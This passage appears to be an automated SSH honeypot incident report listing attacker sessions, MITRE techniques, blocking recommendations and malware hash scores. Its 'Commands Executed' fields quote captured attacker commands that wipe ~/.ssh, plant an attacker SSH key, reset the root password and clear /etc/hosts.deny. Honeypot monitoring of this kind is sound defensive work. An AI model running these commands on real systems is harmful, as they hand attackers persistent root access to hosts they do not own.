| `2026-04-17 09:16:26` | `cowrie.log.closed` |
| `2026-04-17 09:16:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa7dff134d41

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-17 09:16 |
| **Last Seen** | 2026-04-17 09:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:16:28` | `cowrie.session.connect` |
| `2026-04-17 09:16:28` | `cowrie.client.version` |
| `2026-04-17 09:16:28` | `cowrie.client.kex` |
| `2026-04-17 09:16:28` | `cowrie.login.success` |
| `2026-04-17 09:16:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faf3e6da7bb0

| Field | Detail |
|---|---|
| **Source IP** | `103.234.53[.]69` |
| **First Seen** | 2026-04-17 09:18 |
| **Last Seen** | 2026-04-17 09:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:18:26` | `cowrie.session.connect` |
| `2026-04-17 09:18:26` | `cowrie.client.version` |
| `2026-04-17 09:18:27` | `cowrie.client.kex` |
| `2026-04-17 09:18:27` | `cowrie.login.success` |
| `2026-04-17 09:18:28` | `cowrie.session.params` |
| `2026-04-17 09:18:28` | `cowrie.command.input` |
| `2026-04-17 09:18:28` | `cowrie.command.failed` |
| `2026-04-17 09:18:28` | `cowrie.log.closed` |
| `2026-04-17 09:18:29` | `cowrie.session.params` |
| `2026-04-17 09:18:29` | `cowrie.command.input` |
| `2026-04-17 09:18:29` | `cowrie.session.file_download` |
| `2026-04-17 09:18:29` | `cowrie.log.closed` |
| `2026-04-17 09:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.234.53[.]69` to AbuseIPDB if not already reported
- [ ] Block `103.234.53[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07ddf4f8b6b5

| Field | Detail |
|---|---|
| **Source IP** | `103.234.53[.]69` |
| **First Seen** | 2026-04-17 09:18 |
| **Last Seen** | 2026-04-17 09:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:18:32` | `cowrie.session.connect` |
| `2026-04-17 09:18:32` | `cowrie.client.version` |
| `2026-04-17 09:18:32` | `cowrie.client.kex` |
| `2026-04-17 09:18:33` | `cowrie.login.success` |
| `2026-04-17 09:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.234.53[.]69` to AbuseIPDB if not already reported
- [ ] Block `103.234.53[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb84b739f001

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-17 09:19 |
| **Last Seen** | 2026-04-17 09:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:19:02` | `cowrie.session.connect` |
| `2026-04-17 09:19:02` | `cowrie.client.version` |
| `2026-04-17 09:19:03` | `cowrie.client.kex` |
| `2026-04-17 09:19:03` | `cowrie.login.success` |
| `2026-04-17 09:19:03` | `cowrie.session.params` |
| `2026-04-17 09:19:03` | `cowrie.command.input` |
| `2026-04-17 09:19:03` | `cowrie.command.failed` |
| `2026-04-17 09:19:04` | `cowrie.log.closed` |
| `2026-04-17 09:19:04` | `cowrie.session.params` |
| `2026-04-17 09:19:04` | `cowrie.command.input` |
| `2026-04-17 09:19:04` | `cowrie.session.file_download` |
| `2026-04-17 09:19:04` | `cowrie.log.closed` |
| `2026-04-17 09:19:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc821b709880

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-17 09:19 |
| **Last Seen** | 2026-04-17 09:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:19:06` | `cowrie.session.connect` |
| `2026-04-17 09:19:06` | `cowrie.client.version` |
| `2026-04-17 09:19:06` | `cowrie.client.kex` |
| `2026-04-17 09:19:07` | `cowrie.login.success` |
| `2026-04-17 09:19:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9971f3f895cb

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-17 09:19 |
| **Last Seen** | 2026-04-17 09:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:19:49` | `cowrie.session.connect` |
| `2026-04-17 09:19:49` | `cowrie.client.version` |
| `2026-04-17 09:19:49` | `cowrie.client.kex` |
| `2026-04-17 09:19:50` | `cowrie.login.success` |
| `2026-04-17 09:19:50` | `cowrie.session.params` |
| `2026-04-17 09:19:50` | `cowrie.command.input` |
| `2026-04-17 09:19:50` | `cowrie.command.failed` |
| `2026-04-17 09:19:50` | `cowrie.log.closed` |
| `2026-04-17 09:19:51` | `cowrie.session.params` |
| `2026-04-17 09:19:51` | `cowrie.command.input` |
| `2026-04-17 09:19:51` | `cowrie.session.file_download` |
| `2026-04-17 09:19:51` | `cowrie.log.closed` |
| `2026-04-17 09:19:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ad9554d4deb

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-17 09:19 |
| **Last Seen** | 2026-04-17 09:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:19:53` | `cowrie.session.connect` |
| `2026-04-17 09:19:53` | `cowrie.client.version` |
| `2026-04-17 09:19:53` | `cowrie.client.kex` |
| `2026-04-17 09:19:53` | `cowrie.login.success` |
| `2026-04-17 09:19:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec6c110f961b

| Field | Detail |
|---|---|
| **Source IP** | `103.234.53[.]69` |
| **First Seen** | 2026-04-17 09:20 |
| **Last Seen** | 2026-04-17 09:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:20:10` | `cowrie.session.connect` |
| `2026-04-17 09:20:10` | `cowrie.client.version` |
| `2026-04-17 09:20:10` | `cowrie.client.kex` |
| `2026-04-17 09:20:11` | `cowrie.login.success` |
| `2026-04-17 09:20:11` | `cowrie.session.params` |
| `2026-04-17 09:20:11` | `cowrie.command.input` |
| `2026-04-17 09:20:11` | `cowrie.command.failed` |
| `2026-04-17 09:20:12` | `cowrie.log.closed` |
| `2026-04-17 09:20:12` | `cowrie.session.params` |
| `2026-04-17 09:20:12` | `cowrie.command.input` |
| `2026-04-17 09:20:12` | `cowrie.session.file_download` |
| `2026-04-17 09:20:12` | `cowrie.log.closed` |
| `2026-04-17 09:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.234.53[.]69` to AbuseIPDB if not already reported
- [ ] Block `103.234.53[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-484aaf0a4b2a

| Field | Detail |
|---|---|
| **Source IP** | `103.234.53[.]69` |
| **First Seen** | 2026-04-17 09:20 |
| **Last Seen** | 2026-04-17 09:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:20:15` | `cowrie.session.connect` |
| `2026-04-17 09:20:15` | `cowrie.client.version` |
| `2026-04-17 09:20:15` | `cowrie.client.kex` |
| `2026-04-17 09:20:16` | `cowrie.login.success` |
| `2026-04-17 09:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.234.53[.]69` to AbuseIPDB if not already reported
- [ ] Block `103.234.53[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a066c3b09d69

| Field | Detail |
|---|---|
| **Source IP** | `122.166.167[.]154` |
| **First Seen** | 2026-04-17 09:20 |
| **Last Seen** | 2026-04-17 09:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:20:25` | `cowrie.session.connect` |
| `2026-04-17 09:20:25` | `cowrie.client.version` |
| `2026-04-17 09:20:25` | `cowrie.client.kex` |
| `2026-04-17 09:20:25` | `cowrie.login.success` |
| `2026-04-17 09:20:25` | `cowrie.session.params` |
| `2026-04-17 09:20:25` | `cowrie.command.input` |
| `2026-04-17 09:20:25` | `cowrie.command.failed` |
| `2026-04-17 09:20:25` | `cowrie.log.closed` |
| `2026-04-17 09:20:25` | `cowrie.session.params` |
| `2026-04-17 09:20:25` | `cowrie.command.input` |
| `2026-04-17 09:20:25` | `cowrie.session.file_download` |
| `2026-04-17 09:20:25` | `cowrie.log.closed` |
| `2026-04-17 09:20:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.166.167[.]154` to AbuseIPDB if not already reported
- [ ] Block `122.166.167[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ce3a6264cb9

| Field | Detail |
|---|---|
| **Source IP** | `122.166.167[.]154` |
| **First Seen** | 2026-04-17 09:20 |
| **Last Seen** | 2026-04-17 09:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:20:28` | `cowrie.session.connect` |
| `2026-04-17 09:20:28` | `cowrie.client.version` |
| `2026-04-17 09:20:28` | `cowrie.client.kex` |
| `2026-04-17 09:20:28` | `cowrie.login.success` |
| `2026-04-17 09:20:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.166.167[.]154` to AbuseIPDB if not already reported
- [ ] Block `122.166.167[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00af53fc2911

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-17 09:22 |
| **Last Seen** | 2026-04-17 09:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:bVH8gidVSPiD"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:22:26` | `cowrie.session.connect` |
| `2026-04-17 09:22:26` | `cowrie.client.version` |
| `2026-04-17 09:22:26` | `cowrie.client.kex` |
| `2026-04-17 09:22:27` | `cowrie.login.success` |
| `2026-04-17 09:22:27` | `cowrie.session.params` |
| `2026-04-17 09:22:27` | `cowrie.command.input` |
| `2026-04-17 09:22:27` | `cowrie.command.failed` |
| `2026-04-17 09:22:27` | `cowrie.log.closed` |
| `2026-04-17 09:22:28` | `cowrie.session.params` |
| `2026-04-17 09:22:28` | `cowrie.command.input` |
| `2026-04-17 09:22:28` | `cowrie.session.file_download` |
| `2026-04-17 09:22:28` | `cowrie.log.closed` |
| `2026-04-17 09:22:37` | `cowrie.session.params` |
| `2026-04-17 09:22:37` | `cowrie.command.input` |
| `2026-04-17 09:22:37` | `cowrie.log.closed` |
| `2026-04-17 09:22:38` | `cowrie.session.params` |
| `2026-04-17 09:22:38` | `cowrie.command.input` |
| `2026-04-17 09:22:38` | `cowrie.log.closed` |
| `2026-04-17 09:22:38` | `cowrie.session.params` |
| `2026-04-17 09:22:38` | `cowrie.command.input` |
| `2026-04-17 09:22:38` | `cowrie.session.file_download` |
| `2026-04-17 09:22:38` | `cowrie.log.closed` |
| `2026-04-17 09:22:38` | `cowrie.session.params` |
| `2026-04-17 09:22:38` | `cowrie.command.input` |
| `2026-04-17 09:22:39` | `cowrie.log.closed` |
| `2026-04-17 09:22:39` | `cowrie.session.params` |
| `2026-04-17 09:22:39` | `cowrie.command.input` |
| `2026-04-17 09:22:39` | `cowrie.log.closed` |
| `2026-04-17 09:22:39` | `cowrie.session.params` |
| `2026-04-17 09:22:39` | `cowrie.command.input` |
| `2026-04-17 09:22:39` | `cowrie.command.input` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `59.50.24[.]47` | **27** | 2026-04-17 06:55 | 2026-04-17 07:19 | 41m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `125.77.133[.]94` | **25** | 2026-04-17 06:46 | 2026-04-17 07:10 | 30m | 9 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `182.52.109[.]76` | **25** | 2026-04-17 06:53 | 2026-04-17 07:37 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `206.42.14[.]196` | **25** | 2026-04-17 06:42 | 2026-04-17 07:26 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.78.29[.]97` | **25** | 2026-04-17 06:43 | 2026-04-17 07:18 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `119.96.157[.]188` | **21** | 2026-04-17 09:00 | 2026-04-17 09:15 | 30m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `93.48.24[.]181` | **15** | 2026-04-17 09:04 | 2026-04-17 09:22 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.234.53[.]69` | **12** | 2026-04-17 09:03 | 2026-04-17 09:21 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `58.229.141[.]26` | **12** | 2026-04-17 09:01 | 2026-04-17 09:21 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `210.79.191[.]76` | **11** | 2026-04-17 09:02 | 2026-04-17 09:21 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `122.166.167[.]154` | **2** | 2026-04-17 08:59 | 2026-04-17 09:20 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `183.56.216[.]153` | **2** | 2026-04-17 06:45 | 2026-04-17 06:46 | 2m | 0 | `T1592` | 🟢 LOW |
| `101.126.23[.]159` | 1 | 2026-04-17 06:57 | 2026-04-17 06:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.96.199[.]38` | 1 | 2026-04-17 06:46 | 2026-04-17 06:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.48.113[.]47` | 1 | 2026-04-17 07:39 | 2026-04-17 07:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.48.123[.]76` | 1 | 2026-04-17 06:59 | 2026-04-17 07:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.113[.]212` | 1 | 2026-04-17 09:01 | 2026-04-17 09:01 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.121[.]146` | 1 | 2026-04-17 09:05 | 2026-04-17 09:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.123[.]50` | 1 | 2026-04-17 06:54 | 2026-04-17 06:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `194.187.176[.]86` | 1 | 2026-04-17 08:14 | 2026-04-17 08:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `222.71.205[.]34` | 1 | 2026-04-17 06:44 | 2026-04-17 06:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.132.227[.]251` | 1 | 2026-04-17 06:42 | 2026-04-17 06:42 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `68.169.244[.]47` | 1 | 2026-04-17 08:05 | 2026-04-17 08:05 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
